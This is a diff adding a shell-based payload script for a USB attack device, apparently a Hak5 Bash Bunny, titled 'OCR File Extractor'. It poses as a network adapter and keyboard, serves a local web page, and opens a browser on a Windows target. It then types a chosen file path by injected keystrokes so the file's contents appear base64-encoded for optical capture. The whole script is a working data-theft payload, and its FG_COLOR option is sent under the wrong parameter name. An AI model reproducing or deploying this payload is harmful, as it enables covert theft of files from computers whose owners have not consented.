@@ -1,0 +1,120 @@
+#!/bin/bash
+#
+# Title:         OCR File Extractor
+# Author:        Jiagi
+# Version:       1.0
+# Target:        Windows
+#
+# Displays a file's contents encoded in base64, using a browser.
+#
+
+##################################################################
+#                                                                #
+# If you are not using a variable, then you must COMMENT IT OUT. #
+#                                                                #
+##################################################################
+
+FONT_SIZE="16"
+PADDING_X="1"
+PADDING_Y="5"
+#MARGIN_TOP=""
+#MARGIN_LEFT=""
+#MARGIN_BOTTOM=""
+#MARGIN_RIGHT=""
+FRAME_TIME="300"
+#FONT=""
+#BG_COLOR=""
+#FG_COLOR=""
+#WAIT_TIME=""
+
+TARGET_FILE="C:\file.txt"
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET TARGET_IP
+GET SWITCH_POSITION
+GET HOST_IP
+
+cd /root/udisk/payloads/$SWITCH_POSITION
+
+# disallow outgoing dns requests so server starts immediately (credit audibleblink)
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &> log.txt &
+
+# wait until port is listening (credit audibleblink)
+while ! nc -z localhost 80; do sleep 0.2; done
+
+LED STAGE1
+
+URL="http://$HOST_IP/index.html?"
+
+if [ ! -z ${FONT_SIZE+x} ]; then
+	URL=$URL"fontsize="$FONT_SIZE"&"
+fi
+
+if [ ! -z ${PADDING_X+x} ]; then
+	URL=$URL"paddingX="$PADDING_X"&"
+fi
+
+if [ ! -z ${PADDING_Y+x} ]; then
+	URL=$URL"paddingY="$PADDING_Y"&"
+fi
+
+if [ ! -z ${MARGIN_TOP+x} ]; then
+	URL=$URL"marginTop="$MARGIN_TOP"&"
+fi
+
+if [ ! -z ${MARGIN_LEFT+x} ]; then
+	URL=$URL"marginLeft="$MARGIN_LEFT"&"
+fi
+
+if [ ! -z ${MARGIN_BOTTOM+x} ]; then
+	URL=$URL"marginBottom="$MARGIN_BOTTOM"&"
+fi
+
+if [ ! -z ${MARGIN_RIGHT+x} ]; then
+	URL=$URL"marginRight="$MARGIN_RIGHT"&"
+fi
+
+if [ ! -z ${FRAME_TIME+x} ]; then
+	URL=$URL"frametime="$FRAME_TIME"&"
+fi
+
+if [ ! -z ${FONT+x} ]; then
+	URL=$URL"font="$FONT"&"
+fi
+
+if [ ! -z ${BG_COLOR+x} ]; then
+	URL=$URL"bgcolor="$BG_COLOR"&"
+fi
+
+if [ ! -z ${FG_COLOR+x} ]; then
+	URL=$URL"fontsize="$FG_COLOR"&"
+fi
+
+if [ ! -z ${WAIT_TIME+x} ]; then
+	URL=$URL"waittime="$WAIT_TIME"&"
+fi
+
+RUN WIN "$URL"
+
+while [ $(tail log.txt | grep loaded.html | wc -m) -le 2 ]; do sleep 0.2; done
+
+sleep 1;
+
+LED STAGE2
+
+QUACK TAB
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+Q STRING $TARGET_FILE
+QUACK DELAY 500
+QUACK ENTER
+
+LED CLEANUP
+
+rm log.txt
+
+LED FINISH
